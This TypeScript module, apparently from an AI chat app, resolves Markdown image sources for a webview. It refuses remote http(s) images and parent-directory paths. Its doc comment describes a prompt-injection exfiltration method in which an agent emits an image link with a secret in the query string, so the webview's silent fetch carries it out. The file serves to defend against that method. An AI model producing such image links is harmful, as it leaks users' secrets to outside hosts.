import {
  ATTACHMENT_PROTOCOL_SCHEME,
  attachmentProtocolUrl,
  toRenderableAttachmentUrl
} from "../../shared/attachmentProtocol.js";
import {
  WORKSPACE_ASSET_PROTOCOL_SCHEME,
  toRenderableWorkspaceAssetUrl,
  workspaceAssetUrl
} from "../../shared/assetProtocol.js";

function decodePath(value: string): string {
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

function pathInside(root: string, candidate: string): boolean {
  const base = root.replace(/\/+$/, "");
  return candidate === base || candidate.startsWith(`${base}/`);
}

/**
 * Resolve a chat Markdown image to a URL the webview may load, or null when
 * there is none. Workspace images use the workspace asset protocol (or remote
 * HTTP endpoint on mobile). Other absolute paths use the attachment protocol,
 * whose handler serves only files already stored in Argmax's attachment
 * directory.
 *
 * A remote `http(s)` image is never loadable. Loading one is a silent outbound
 * request the reader did not ask for, so a prompt-injected agent could name
 * `![](https://host/x.png?<secret>)` and have the webview carry the secret out.
 * The caller renders those as a link the reader can choose to follow.
 */
export function resolveChatImageSrc(
  source: string | undefined,
  workspacePath: string | null | undefined
): string | null {
  if (!source) return null;
  if (/^https?:\/\//i.test(source)) return null;
  if (source.startsWith(`${ATTACHMENT_PROTOCOL_SCHEME}://`)) {
    return toRenderableAttachmentUrl(source);
  }
  if (source.startsWith(`${WORKSPACE_ASSET_PROTOCOL_SCHEME}://`)) {
    return toRenderableWorkspaceAssetUrl(source);
  }

  const decoded = decodePath(source);
  if (decoded.startsWith("/")) {
    return workspacePath && pathInside(workspacePath, decoded)
      ? workspaceAssetUrl(decoded)
      : attachmentProtocolUrl(decoded);
  }
  if (!workspacePath) return null;

  const segments = decoded.split("/");
  if (segments.some((segment) => segment === "..")) return null;
  const absolute = `${workspacePath.replace(/\/+$/, "")}/${segments
    .filter((segment) => segment !== "" && segment !== ".")
    .join("/")}`;
  return workspaceAssetUrl(absolute);
}
